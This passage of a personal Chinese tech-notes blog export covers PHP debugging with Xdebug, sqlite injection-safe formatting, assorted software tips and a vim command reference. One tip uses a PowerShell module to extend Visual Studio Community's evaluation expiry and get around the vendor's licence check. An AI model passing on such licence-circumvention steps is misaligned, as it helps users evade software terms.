<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="title function_ invoke__">debug_print_backtrace</span>();</span><br><span class="line"><span class="variable">$trace</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br></pre></td></tr></table></figure>

<h2 id="重定向标准输出"><a href="#重定向标准输出" class="headerlink" title="重定向标准输出"></a>重定向标准输出</h2><p>php内置有几个标准输出变量，如$STDOUT、$STDERR等，实质上是文件句柄</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;STDERR&#x27;</span>, <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://stderr&#x27;</span>, <span class="string">&#x27;w&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>所以重定向很简单</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="title function_ invoke__">fclose</span>(STDERR);</span><br><span class="line"><span class="variable">$STDERR</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="调试php方法"><a href="#调试php方法" class="headerlink" title="调试php方法"></a>调试php方法</h2><ul>
<li>需要安装xdebug，根据版本下载相应的源码<ul>
<li><a href="https://xdebug.org/download/historical">https://xdebug.org/download/historical</a></li>
</ul>
</li>
<li>服务器需要安装php-dev</li>
<li>编译安装xdebug<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压xdebug到一个目录</span></span><br><span class="line">phpize</span><br><span class="line">./configure --enable-xdebug</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure></li>
<li>编辑php.ini，一般在&#x2F;etc&#x2F;phpx&#x2F;xxxx&#x2F;php.ini<ul>
<li>后面加上下面配置<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Xdebug]</span><br><span class="line">zend_extension=xdebug.so</span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line">xdebug.remote_autostart = 1</span><br><span class="line">xdebug.remote_port = 9001</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>重启apache或者nginx</li>
<li>vscode安装remote-ssh插件并连接上服务器</li>
<li>安装php debug插件</li>
<li>进入目录，配置debug，创建launch.json，选择php会自动写入xdebug的配置<ul>
<li>端口默认9000，可改，就像上面写的php.ini用的是9001，就需要改成9001</li>
</ul>
</li>
<li>开始你的调试之旅</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>sqlite学习笔记(C语言)</title>
    <url>/blogs/2019-09-18-sqlite/</url>
    <content><![CDATA[<h1 id="sqlite3"><a href="#sqlite3" class="headerlink" title="sqlite3"></a>sqlite3</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="sqlite3-snprintf"><a href="#sqlite3-snprintf" class="headerlink" title="sqlite3_snprintf"></a>sqlite3_snprintf</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sqlite3自带的防sql注入的snprintf</span></span><br><span class="line"><span class="comment"> * @param size 字符串最大大小</span></span><br><span class="line"><span class="comment"> * @param str 打印输出字符串</span></span><br><span class="line"><span class="comment"> * @param fmt 打印格式</span></span><br><span class="line"><span class="comment"> * @return 字符串首地址，创建成功；NULL，失败</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">SQLITE_API <span class="type">char</span> *<span class="title">sqlite3_snprintf</span><span class="params">(<span class="type">int</span> size, <span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>sql注入会用单引号进行，使用<code>%q</code>代替<code>%s</code>输入字符串，会将单引号替换为两个单引号</li>
</ul>
<h3 id="sqlite3-exec"><a href="#sqlite3-exec" class="headerlink" title="sqlite3_exec"></a>sqlite3_exec</h3><ul>
<li>没有数据不会进入回调函数</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>软件使用技巧记录</title>
    <url>/blogs/2019-09-12-softwareTips/</url>
    <content><![CDATA[<h1 id="一、source-insight"><a href="#一、source-insight" class="headerlink" title="一、source insight"></a>一、source insight</h1><h2 id="只添加特定后缀文件"><a href="#只添加特定后缀文件" class="headerlink" title="只添加特定后缀文件"></a>只添加特定后缀文件</h2><p>在<code>Add and remove project files</code>时，选中要添加的文件夹，在框内输入<code>*.xx</code>然后回车，再点击<code>Add Tree</code>即可。</p>
<h2 id="工程文件目录显示裁剪前面绝对路径"><a href="#工程文件目录显示裁剪前面绝对路径" class="headerlink" title="工程文件目录显示裁剪前面绝对路径"></a>工程文件目录显示裁剪前面绝对路径</h2><p>在<code>Project Setting</code>里面配置，<code>File Paths</code>-&gt;<code>Project Source Directory</code>下配置源文件路径。配好后就可以看到工程文件目录下文件的路径前面裁剪掉了配置的路径，只留下配置路径的子目录。</p>
<h1 id="二、chrome"><a href="#二、chrome" class="headerlink" title="二、chrome"></a>二、chrome</h1><h2 id="1-下载离线包"><a href="#1-下载离线包" class="headerlink" title="1. 下载离线包"></a>1. 下载离线包</h2><p>针对在内网环境下需要更新chrome需要下载离线包，官网下载为在线安装包，下载离线包的网址为，也就是在原本的网址上添加<code>?standalone=1</code></p>
<p><a href="https://www.google.cn/intl/zh-CN/chrome/?standalone=1">https://www.google.cn/intl/zh-CN/chrome/?standalone=1</a></p>
<h2 id="2-windows抓https并解密"><a href="#2-windows抓https并解密" class="headerlink" title="2. windows抓https并解密"></a>2. windows抓https并解密</h2><p>参考<a href="https://www.cnblogs.com/aucy/p/9082429.html">这个帖子</a></p>
<ul>
<li>给系统环境变量加一个<code>SSLKEYLOGFILE</code>变量，路径随便设置，这个会把chrome解析到的私钥存放到这个位置</li>
<li>在wireshark里面配置中找到<code>protocol -&gt; TLS/SSL</code>，将<code>(Pre)-Master-Secret log filename</code>设置到同样的文件</li>
<li>重启chrome就可以解密了</li>
<li>每次解密都要重启chrome才行</li>
</ul>
<h2 id="3-好用的插件"><a href="#3-好用的插件" class="headerlink" title="3. 好用的插件"></a>3. 好用的插件</h2><h3 id="1-github加速"><a href="#1-github加速" class="headerlink" title="(1) github加速"></a>(1) github加速</h3><ul>
<li>加速github下载的插件</li>
</ul>
<h2 id="4-chrome处理json时preview中文乱码"><a href="#4-chrome处理json时preview中文乱码" class="headerlink" title="4. chrome处理json时preview中文乱码"></a>4. chrome处理json时preview中文乱码</h2><ul>
<li>需要服务端将响应头的<code>Content-Type</code>设置为<code>application/json; charset=utf-8</code>即可</li>
</ul>
<h1 id="三、vscode"><a href="#三、vscode" class="headerlink" title="三、vscode"></a>三、vscode</h1><p><a href="/blogs/2022-02-15-vscode">vscode使用技巧记录</a></p>
<h1 id="四、firefox"><a href="#四、firefox" class="headerlink" title="四、firefox"></a>四、firefox</h1><h2 id="1-修改user-agent"><a href="#1-修改user-agent" class="headerlink" title="1. 修改user-agent"></a>1. 修改user-agent</h2><ol>
<li>访问<code>about:config</code></li>
<li>创建或修改<code>general.useragent.override</code>，值为想要的user-agent值</li>
</ol>
<h1 id="五、网页小技巧"><a href="#五、网页小技巧" class="headerlink" title="五、网页小技巧"></a>五、网页小技巧</h1><h2 id="1-github查看代码技巧"><a href="#1-github查看代码技巧" class="headerlink" title="1. github查看代码技巧"></a>1. github查看代码技巧</h2><p>将<code>https://github.com/android/ndk-samples</code>替换成<code>https://github1s.com/android/ndk-samples</code>可以打开网页版vscode进行代码查看</p>
<h1 id="六、putty"><a href="#六、putty" class="headerlink" title="六、putty"></a>六、putty</h1><h2 id="1-修改配色方案"><a href="#1-修改配色方案" class="headerlink" title="1. 修改配色方案"></a>1. 修改配色方案</h2><ul>
<li>保存后执行就好，将arch-work改成自己的配置文件名字</li>
<li>下面是我的一个配色方案，感觉还不错</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour0 /t REG_SZ /d <span class="number">58</span>,<span class="number">244</span>,<span class="number">213</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour1 /t REG_SZ /d <span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour2 /t REG_SZ /d <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour3 /t REG_SZ /d <span class="number">85</span>,<span class="number">85</span>,<span class="number">85</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour4 /t REG_SZ /d <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour5 /t REG_SZ /d <span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour6 /t REG_SZ /d <span class="number">68</span>,<span class="number">68</span>,<span class="number">68</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour7 /t REG_SZ /d <span class="number">119</span>,<span class="number">119</span>,<span class="number">119</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour8 /t REG_SZ /d <span class="number">255</span>,<span class="number">0</span>,<span class="number">84</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour9 /t REG_SZ /d <span class="number">214</span>,<span class="number">94</span>,<span class="number">117</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour10 /t REG_SZ /d <span class="number">177</span>,<span class="number">214</span>,<span class="number">48</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour11 /t REG_SZ /d <span class="number">85</span>,<span class="number">255</span>,<span class="number">85</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour12 /t REG_SZ /d <span class="number">240</span>,<span class="number">230</span>,<span class="number">140</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour13 /t REG_SZ /d <span class="number">255</span>,<span class="number">255</span>,<span class="number">85</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour14 /t REG_SZ /d <span class="number">182</span>,<span class="number">224</span>,<span class="number">229</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour15 /t REG_SZ /d <span class="number">159</span>,<span class="number">211</span>,<span class="number">229</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour16 /t REG_SZ /d <span class="number">255</span>,<span class="number">222</span>,<span class="number">173</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour17 /t REG_SZ /d <span class="number">255</span>,<span class="number">85</span>,<span class="number">255</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour18 /t REG_SZ /d <span class="number">103</span>,<span class="number">190</span>,<span class="number">227</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour19 /t REG_SZ /d <span class="number">255</span>,<span class="number">215</span>,<span class="number">0</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour20 /t REG_SZ /d <span class="number">237</span>,<span class="number">237</span>,<span class="number">237</span>  /f</span><br><span class="line">reg add HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\arch-work /v Colour21 /t REG_SZ /d <span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>  /f</span><br></pre></td></tr></table></figure>

<h2 id="2-使用id-rsa私钥登陆"><a href="#2-使用id-rsa私钥登陆" class="headerlink" title="2. 使用id_rsa私钥登陆"></a>2. 使用id_rsa私钥登陆</h2><ul>
<li>需要使用自带的puttygen将id_rsa导入进去另存为putty识别的密钥，再次使用就可以了</li>
</ul>
<h1 id="七、sublime-text"><a href="#七、sublime-text" class="headerlink" title="七、sublime text"></a>七、sublime text</h1><h2 id="1-查看文件在文件树中的位置"><a href="#1-查看文件在文件树中的位置" class="headerlink" title="1. 查看文件在文件树中的位置"></a>1. 查看文件在文件树中的位置</h2><ul>
<li>在打开的文件中右键选<code>Reveal in Side Bar</code></li>
</ul>
<h1 id="八、vmware"><a href="#八、vmware" class="headerlink" title="八、vmware"></a>八、vmware</h1><h2 id="1-windows安装linux虚拟机启动报A-fault-has-occurred-causing-a-virtual-CPU-to-enter-the-shutdown-state"><a href="#1-windows安装linux虚拟机启动报A-fault-has-occurred-causing-a-virtual-CPU-to-enter-the-shutdown-state" class="headerlink" title="1. windows安装linux虚拟机启动报A fault has occurred causing a virtual CPU to enter the shutdown state"></a>1. windows安装linux虚拟机启动报<code>A fault has occurred causing a virtual CPU to enter the shutdown state</code></h2><ul>
<li>看看是不是装了<code>vmare 16.0</code>，是的话更新到最新版vmware，将对应的虚拟机迁移到新版本即可，<code>16.0</code>存在bug</li>
</ul>
<h2 id="2-合并分离的磁盘文件"><a href="#2-合并分离的磁盘文件" class="headerlink" title="2. 合并分离的磁盘文件"></a>2. 合并分离的磁盘文件</h2><ul>
<li>查看对应虚拟机中磁盘文件路径，然后执行命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vmware-vdiskmanager -r Windows\ 10-0-000004.vmdk -t 0 merged.vmdk</span><br></pre></td></tr></table></figure>

<h1 id="九、Visual-Studio-Community"><a href="#九、Visual-Studio-Community" class="headerlink" title="九、Visual Studio Community"></a>九、Visual Studio Community</h1><h2 id="1-增加评估时间"><a href="#1-增加评估时间" class="headerlink" title="1. 增加评估时间"></a>1. 增加评估时间</h2><p>参考 <a href="https://github.com/beatcracker/VSCELicense">https://github.com/beatcracker/VSCELicense</a></p>
<ul>
<li>使用管理员启动powershell</li>
<li>把仓库clone下来，cd到目录</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="comment">@REM 添加可执行策略</span></span><br><span class="line"><span class="built_in">Set</span>-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process</span><br><span class="line"><span class="comment">@REM 导入powershell命令</span></span><br><span class="line">Import-Module -Name .\VSCELicense.psd1</span><br><span class="line"><span class="comment">@REM 查看当前过期时间</span></span><br><span class="line">Get-VSCELicenseExpirationDate -Version <span class="number">2015</span></span><br><span class="line"><span class="comment">@REM 基于当前时间增加评估时间，多次执行效果一样，不会多增加时间，而且最大31</span></span><br><span class="line"><span class="built_in">Set</span>-VSCELicenseExpirationDate -Version <span class="number">2015</span> -AddDays <span class="number">31</span></span><br></pre></td></tr></table></figure>

<h1 id="十、Remmina"><a href="#十、Remmina" class="headerlink" title="十、Remmina"></a>十、Remmina</h1><h2 id="1-远程连接到windows中文输入法无法使用"><a href="#1-远程连接到windows中文输入法无法使用" class="headerlink" title="1. 远程连接到windows中文输入法无法使用"></a>1. 远程连接到windows中文输入法无法使用</h2><ul>
<li>在<code>Remmina-&gt;Preferences-&gt;RDP-&gt;Use client keyboard mapping</code>把前面的勾去掉即可</li>
</ul>
<h1 id="十一、shadowsocks"><a href="#十一、shadowsocks" class="headerlink" title="十一、shadowsocks"></a>十一、shadowsocks</h1><h2 id="1-windows上配置shadowsocks需要git-bash使用需要单独配置"><a href="#1-windows上配置shadowsocks需要git-bash使用需要单独配置" class="headerlink" title="1. windows上配置shadowsocks需要git bash使用需要单独配置"></a>1. windows上配置shadowsocks需要git bash使用需要单独配置</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=socks5://127.0.0.1:1080</span><br><span class="line">export https_proxy=socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Software Usage</category>
      </categories>
  </entry>
  <entry>
    <title>vi/vim命令学习</title>
    <url>/blogs/2019-09-10-vim/</url>
    <content><![CDATA[<h1 id="一、基础配置和命令"><a href="#一、基础配置和命令" class="headerlink" title="一、基础配置和命令"></a>一、基础配置和命令</h1><h2 id="1-常用命令和快捷键（vi适用部分命令）"><a href="#1-常用命令和快捷键（vi适用部分命令）" class="headerlink" title="1. 常用命令和快捷键（vi适用部分命令）"></a>1. 常用命令和快捷键（vi适用部分命令）</h2><h3 id="1-1-normal模式"><a href="#1-1-normal模式" class="headerlink" title="1.1. normal模式"></a>1.1. normal模式</h3><ul>
<li><code>i</code>: 在光标当前位置插入，进入编辑模式</li>
<li><code>a</code>: 在光标后面插入，进入编辑模式</li>
<li><code>Esc</code>: 退出编辑模式</li>
<li><code>Shift + z, Shift + z</code>: 保存并退出</li>
<li><code>Shift + z, Shift + q</code>: 不保存退出</li>
<li><code>h</code>: 左移光标</li>
<li><code>l</code>: 右移光标</li>
<li><code>j</code>: 下移光标</li>
<li><code>k</code>: 上移光标</li>
<li><code>w</code>: 标点分割，下一个字首</li>
<li><code>e</code>: 标点分割，下一个字尾</li>
<li><code>b</code>: 标点分割，上一个字首</li>
<li><code>Shitf + w</code>: 空格分割，下一个字首</li>
<li><code>Shift + e</code>: 空格分割，下一个字尾</li>
<li><code>Shift + b</code>: 空格分割，上一个字首</li>
<li><code>0</code>: 跳至行首，不管有无缩进，就是跳到第0个字符</li>
<li><code>[n]|</code>: 跳至第n列</li>
<li><code>f[x]</code>: 跳至下一个x字符</li>
<li><code>Shift + ^</code>: 跳至行首的第一个字符</li>
<li><code>Shift + $</code>: 跳至行尾</li>
<li><code>gg</code>: 移到文件首行</li>
<li><code>G</code>: 移到文件末行</li>
<li><code>gd</code>: 跳转到符号定义，当前函数</li>
<li><code>gD</code>: 跳转到符号定义，整个文件</li>
<li><code>Ctrl + u</code> &#x2F; <code>PageUp</code>: 向上翻页</li>
<li><code>Ctrl + d</code> &#x2F; <code>PageDown</code>: 向下翻页</li>
<li><code>x</code> &#x2F; <code>Del</code>: 删除光标后面的字符</li>
<li><code>u</code>: 撤销</li>
<li><code>Ctrl + r</code>: 重做</li>
<li><code>Shift + *</code>: 向下查找并高亮光标所在单词</li>
<li><code>Shift + #</code>: 向上查找并高亮光标所在单词</li>
<li><code>:noh</code>: 取消高亮</li>
<li><code>Ctrl + o</code>: 调回上次光标位置</li>
<li><code>Ctrl + i</code>: 跳到下一次光标位置</li>
<li><code>/&lt;xxx&gt;</code>: 当前文件搜索字符串，看设置决定是否区分大小写</li>
<li><code>/\c&lt;xxx&gt;</code>: 当前文件搜索字符串，不区分大小写</li>
<li><code>/\C&lt;xxx&gt;</code>: 当前文件搜索字符串，区分大小写</li>
<li><code>n</code>: 跳到下一个搜索位置</li>
<li><code>N</code>: 跳到上一个搜索位置</li>
<li><code>:&lt;xxx&gt;</code>: 跳转当前文件行号</li>
<li><code>:w</code>: 保存更改</li>
<li><code>:q</code>: 退出当前窗口</li>
<li><code>:q!</code>: 不保留更改退出当前窗口</li>
<li><code>:qa</code>: 退出所有窗口</li>
<li><code>:x</code>: 有改动就写入文件并退出（相当于<code>:wq</code>），没有改动直接退出不改动文件</li>
<li><code>v</code>: 进入选择模式</li>
<li><code>Ctrl + v</code>: 进入块选择模式</li>
<li><code>g, f</code>: 跳转到光标所在的文件</li>
<li><code>p</code>: 粘贴vim剪贴板</li>
<li><code>yy</code>: 复制当前一行</li>
<li><code>diw</code>: 剪切当前单词</li>
<li><code>daw</code>: 剪切当前单词包括前导或后导空格（基于位置分析）</li>
<li><code>dip</code>: 剪切当前段（前后有空行）</li>
<li><code>dap</code>: 剪切当前段包括前导或后导空行（基于位置分析）</li>
<li><code>dd</code>: 剪切当前一行</li>
<li><code>:f</code>: 显示当前文件路径</li>
<li><code>Ctrl + g</code>: 显示当前文件路径</li>
<li><code>(n)&gt;&gt;</code>: 当前行缩进n个tab，默认1个tab</li>
<li><code>(n)&lt;&lt;</code>: 当前行少缩进n个tab，默认1个tab</li>
</ul>
<p><strong>替换命令</strong></p>
<ul>
<li><code>:s/abc/def</code>: 当前行第一个abc替换成def</li>
<li><code>:s/abc/def/g</code>: 当前行所有abc替换成def</li>
<li><code>:%s/abc/def</code>: 在整个文档中将abc替换成def</li>
<li><code>:5,15s/abc/def/g</code>: 在5到15行中将abc替换成def</li>
<li>可以使用正则，规则和sed一样</li>
<li><code>:%s/^/def/g</code>: 每行行首添加def</li>
<li><code>:%s/$/def/g</code>: 每行行尾添加def</li>
</ul>
<h3 id="1-2-visual模式"><a href="#1-2-visual模式" class="headerlink" title="1.2. visual模式"></a>1.2. visual模式</h3><ul>
<li><code>y</code>: 复制选中的文本</li>
<li><code>d</code>: 剪切选中的文本</li>
<li><code>iw</code>: 选中当前单词</li>
<li><code>aw</code>: 选中当前单词包括前导或后导空格（基于位置分析）</li>
<li><code>ip</code>: 选中当前段（前后有空行）</li>
<li><code>ap</code>: 选中当前段包括前导或后导空行（基于位置分析）</li>
<li><code>Shift + &#125;</code>: 跳到下一个空行</li>
<li><code>Shift + &#123;</code>: 跳到上一个空行</li>
</ul>
<h3 id="1-3-replace模式"><a href="#1-3-replace模式" class="headerlink" title="1.3. replace模式"></a>1.3. replace模式</h3><ul>
<li><code>r</code>: 替换当前光标下字符，直接输入即可替换，输入完自动退出到normal模式</li>
<li><code>R</code>: 进入replace模式，输入会直接向后替换，不是插入，类似于按了insert键，<code>esc</code>退出replace模式</li>
</ul>
<h2 id="2-leader键"><a href="#2-leader键" class="headerlink" title="2. leader键"></a>2. leader键</h2><ul>
<li>vim默认的leader键为<code>\</code></li>
</ul>
<h2 id="3-编码"><a href="#3-编码" class="headerlink" title="3. 编码"></a>3. 编码</h2><ol>
<li><code>encoding</code>：VIM 使用的字符编码格式，包括 VIM 的 buffer (缓冲区)、菜单文本、消息文本等。可在~&#x2F;.vimrc 中改变它的值，如果打开的文件编码与该属性配置的编码不同，那么VIM会将编码自动转换到这种编码然后再显示。</li>
<li><code>fileencoding</code>：VIM 当前编辑的文件的字符编码方式，VIM保存文件时也会将文件保存为这种字符编码方式 (不管是否新文件都如此)；如果它的值与encoding不一样，那么保存的时候VIM会自动把文件内容由encoding的编码转换为fileencoding配置编码再保存。而读取文件的时候，该选项的值会自动同步为fileencodings配置的有效编码。</li>
<li><code>fileencodings</code>：此项目配置的是一个编码列表，止Vim在读取文件的时候，会按照它所列出的字符编码方式逐一探测即将打开的文件的字符编码方式，并且将 fileencoding 设置为最终探测到的字符编码方式。因此最好将 Unicode 编码方式放到这个列表的最前面。</li>
<li><code>termencoding</code>：VIM 所工作的终端 (或者 Windows 的 Console 窗口) 的字符编码方式。这个选项在 Windows 下对我们常用的 GUI 模式的 gVim 无效，而对 Console 模式的 Vim 而言就是 Windows 控制台的代码页，并且通常我们不需要改变它。</li>
</ol>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> fileencodings=utf-<span class="number">8</span>,gb2312,gbk,gb18030 	<span class="comment">&quot; 自动从这些编码识别文件编码</span></span><br></pre></td></tr></table></figure>

<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><ul>
<li><code>:set fileencoding=utf-8</code>: 将文件用utf-8保存</li>
<li><code>:e ++enc=gbk</code>: 使用gbk重新打开文件</li>
<li><code>:w ++enc=utf-8</code>: 使用utf-8保存文件</li>
</ul>
<h2 id="4-格式"><a href="#4-格式" class="headerlink" title="4. 格式"></a>4. 格式</h2><h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> fileformats=unix,dos	<span class="comment">&quot; 自动识别unix和dos格式打开</span></span><br></pre></td></tr></table></figure>

<h3 id="命令-1"><a href="#命令-1" class="headerlink" title="命令"></a>命令</h3><ul>
<li><code>:set fileformat=unix</code>: 将文件以unix保存</li>
</ul>
<h2 id="5-读取和保存"><a href="#5-读取和保存" class="headerlink" title="5. 读取和保存"></a>5. 读取和保存</h2><h3 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> autoread        <span class="comment">&quot; 外部改动自动读取</span></span><br><span class="line"><span class="keyword">set</span> autowriteall    <span class="comment">&quot; 和autowrite类似，不过支持跳转命令保存</span></span><br><span class="line"><span class="keyword">set</span> noswapfile      <span class="comment">&quot; 不创建临时文件，防止被提交上去</span></span><br></pre></td></tr></table></figure>

<h2 id="6-高亮"><a href="#6-高亮" class="headerlink" title="6. 高亮"></a>6. 高亮</h2><p>取消高亮</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">nohlsearch</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">noh</span></span><br></pre></td></tr></table></figure>

<h2 id="7-行号"><a href="#7-行号" class="headerlink" title="7. 行号"></a>7. 行号</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">number</span>     <span class="comment">&quot; 显示行号</span></span><br><span class="line"><span class="keyword">set</span> nonumber   <span class="comment">&quot; 取消显示行号</span></span><br></pre></td></tr></table></figure>

<h2 id="8-tab缩进"><a href="#8-tab缩进" class="headerlink" title="8. tab缩进"></a>8. tab缩进</h2><h3 id="8-1-配置"><a href="#8-1-配置" class="headerlink" title="8.1. 配置"></a>8.1. 配置</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> tabstop=<span class="number">4</span>           <span class="comment">&quot; 4个空格识别成tab，读到的\t解释成4个空格</span></span><br><span class="line"><span class="keyword">set</span> softtabstop=<span class="number">4</span>       <span class="comment">&quot; tab输入为4个空格宽度</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">shiftwidth</span>=<span class="number">4</span>        <span class="comment">&quot; 换行时的自动缩进列数</span></span><br><span class="line"><span class="keyword">set</span> expandtab           <span class="comment">&quot; 输入tab转成空格</span></span><br><span class="line"><span class="keyword">set</span> noexpandtab         <span class="comment">&quot; 输入tab不转成空格</span></span><br><span class="line"><span class="keyword">set</span> autoindent          <span class="comment">&quot; 自动缩进</span></span><br><span class="line"><span class="keyword">set</span> smartindent         <span class="comment">&quot; 智能缩进</span></span><br><span class="line"><span class="keyword">filetype</span> <span class="built_in">indent</span> <span class="keyword">on</span>      <span class="comment">&quot; 不同文件使用不同缩进</span></span><br></pre></td></tr></table></figure>

<h3 id="8-2-转换命令"><a href="#8-2-转换命令" class="headerlink" title="8.2. 转换命令"></a>8.2. 转换命令</h3><p><strong>tab转空格</strong></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:<span class="keyword">set</span> tabstop=<span class="number">4</span>           <span class="comment">&quot; 4个空格识别成tab，读到的\t解释成4个空格</span></span><br><span class="line">:<span class="keyword">set</span> expandtab           <span class="comment">&quot; 输入tab转成空格</span></span><br><span class="line">:%retab!                 <span class="comment">&quot; 对当前缓冲区重新tab，!保证除行首同样转换</span></span><br></pre></td></tr></table></figure>

<p><strong>空格转tab</strong></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:<span class="keyword">set</span> tabstop=<span class="number">4</span>           <span class="comment">&quot; 4个空格识别成tab，读到的\t解释成4个空格</span></span><br><span class="line"><span class="keyword">set</span> noexpandtab          <span class="comment">&quot; 输入tab不转成空格</span></span><br><span class="line">:%retab!                 <span class="comment">&quot; 对当前缓冲区重新tab，!保证除行首同样转换</span></span><br></pre></td></tr></table></figure>

<h2 id="9-状态栏"><a href="#9-状态栏" class="headerlink" title="9. 状态栏"></a>9. 状态栏</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> laststatus=<span class="number">2</span>    <span class="comment">&quot; 显示状态栏</span></span><br><span class="line"><span class="keyword">set</span> ruler           <span class="comment">&quot; 显示鼠标所在行数在状态栏</span></span><br><span class="line"><span class="keyword">set</span> cursorline      <span class="comment">&quot; 高亮光标所在行</span></span><br><span class="line"><span class="comment">&quot; 配置状态栏显示格式</span></span><br><span class="line"><span class="keyword">set</span> statusline=%<span class="keyword">w</span>%n:%<span class="keyword">f</span>%<span class="keyword">m</span>\ %r%=Ln:%<span class="keyword">l</span>/%L,Col:%<span class="keyword">c</span>%V\ \ %&#123;(&amp;fenc==\<span class="string">&quot;\&quot;?&amp;enc:&amp;fenc).((exists(\&quot;+bomb\&quot;)\ &amp;&amp;\ &amp;bomb)?\&quot;\ BOM\&quot;:\&quot;\&quot;</span>)&#125;\ \ %&#123;&amp;ff&#125;\ \ %Y\ [%<span class="keyword">P</span>]</span><br></pre></td></tr></table></figure>

